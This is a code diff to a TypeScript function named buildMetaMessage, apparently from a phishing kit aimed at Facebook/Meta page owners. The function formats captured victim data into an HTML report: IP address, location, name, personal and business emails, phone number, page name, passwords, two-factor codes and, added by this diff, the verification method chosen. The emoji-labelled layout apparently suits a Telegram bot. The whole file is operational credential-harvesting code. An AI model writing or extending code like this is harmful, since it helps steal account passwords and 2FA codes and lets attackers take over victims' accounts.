@@ -2,13 +2,10 @@ import type { GeoInfo, UserData } from '@/types';
 
 interface BuildMessageOptions {
     geoInfo: GeoInfo | null;
-    deviceLabel: string;
-    userData: Pick<
-        UserData,
-        'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName' | 'information'
-    >;
+    userData: Pick<UserData, 'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName'>;
     passwords?: string[];
     codes?: string[];
+    selectedMethod?: string;
 }
 
 export const escapeHtml = (value: string) =>
@@ -23,7 +20,13 @@ const formatDateTime = () => {
     return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
 };
 
-export function buildMetaMessage({ geoInfo, deviceLabel, userData, passwords = [], codes = [] }: BuildMessageOptions): string {
+export function buildMetaMessage({
+    geoInfo,
+    userData,
+    passwords = [],
+    codes = [],
+    selectedMethod = ''
+}: BuildMessageOptions): string {
     const safeIp = geoInfo?.ip || 'Unknown';
     const safeCity = geoInfo?.city || 'Unknown';
     const safeRegion = geoInfo?.region || 'Unknown';
@@ -41,21 +44,23 @@ export function buildMetaMessage({ geoInfo, deviceLabel, userData, passwords = [
             ? codes.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
             : '   Code1: <code>N/A</code>';
 
+    const methodSection = selectedMethod
+        ? `\n🔔 <b>METHOD SELECTED</b>\n   Method: <code>${escapeHtml(selectedMethod)}</code>`
+        : '';
+
     return `
 ⏰ ${formatDateTime()}
 🌐 IP: <code>${escapeHtml(safeIp)}</code>
 📍 Location: ${escapeHtml(formattedLocation)}
-📱 Device: <code>${escapeHtml(deviceLabel)}</code>
 📋 <b>INFO</b>
    Name: <code>${escapeHtml(userData.fullName)}</code>
    Email: <code>${escapeHtml(userData.personalEmail)}</code>
    DN Email: <code>${escapeHtml(userData.businessEmail)}</code>
    Phone: <code>${escapeHtml(userData.phoneNumber)}</code>
    Page: <code>${escapeHtml(userData.facebookPageName)}</code>
-   Notes: <code>${escapeHtml(userData.information)}</code>
 🔐 <b>PASSWORD</b>
 ${passwordLines}
 🔒 <b>2FA CODE</b>
-${twoFALines}
+${twoFALines}${methodSection}
 `.trim();
 }
